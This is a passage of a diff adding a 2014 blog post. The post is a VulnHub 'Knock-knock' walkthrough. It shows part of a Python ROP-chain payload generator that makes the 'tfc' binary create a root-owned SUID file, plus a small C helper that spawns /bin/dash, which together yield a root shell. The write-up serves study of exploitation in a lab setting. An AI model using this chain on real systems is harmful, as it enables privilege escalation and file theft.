+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>
+
+    <span class="c"># open(&#39;read&#39;) for reading. fd = 0x06</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049315</span><span class="p">)</span> <span class="c"># &quot;read\x00&quot;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># readonly</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># ?</span>
+
+    <span class="n">iterations</span> <span class="o">=</span> <span class="p">(</span><span class="n">filesize</span> <span class="o">/</span> <span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
+    <span class="k">print</span> <span class="s">&quot;[!] need {} iterations&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iterations</span><span class="p">)</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">iterations</span><span class="p">):</span>
+        <span class="c"># read 0x200 bytes from &#39;read&#39;</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048450</span><span class="p">)</span> <span class="c"># read@plt()</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>        <span class="c"># fd</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># filesize  --&gt; not a lot to work with, but enough for ssh keys</span>
+
+        <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>
+
+    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;Usage: {} &lt;file&gt;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">print</span> <span class="s">&quot;Please provide proper files/symlinks in &#39;read&#39; and &#39;write&#39;&quot;</span>
+        <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">i</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">i</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+
+<p>Unfortunately, if you want to read and write <em>really</em> large files, like <code>/bin/dash</code>, tfc crashes before it can even get to our ROP chain. I solve that with a little helper program:</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span><span class="err">&#39;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+
+
+<p>OK, so now our moment supreme:</p>
+
+<p><img src="/assets/knockknock-rop.png" alt="" /></p>
+
+<p>It worked! The file <code>write</code> is created with SUID set and contains the shell-spawning helper program. Mind you, when I was writing this ROP exploit, I used a local copy of <code>tfc</code> that was not running as root. When the <code>write</code> file was created, it had the SUID bit set, but as soon as something was written to it, the SUID bit was removed. This is security feature (?) is ignored when running as root! Lucky for me ;)</p>
+
+<p>So this is another way to root. I wonder how many more are there! :) Again, thanks zer0w1re and <a href="http://vulnhub.com">VulnHub</a> for hosting this VM!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-10-16T19:37:39+02:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:37 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/" data-via="" data-counturl="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/14/moving-to-github-pages/" title="Previous Post: Moving to GitHub Pages">&laquo; Moving to GitHub Pages</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/16/rop-rop-for-knock-knock/">Rop-rop for Knock-knock</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/14/moving-to-github-pages/">Moving to GitHub Pages</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/14/knock-knock-knocking-on-roots-door/">Knock-knock-knocking on Root&#8217;s Door</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/03/tinyctf/">Tinyctf Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/25/CSAW-s3/">CSAW CTF Expl 300: S3</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
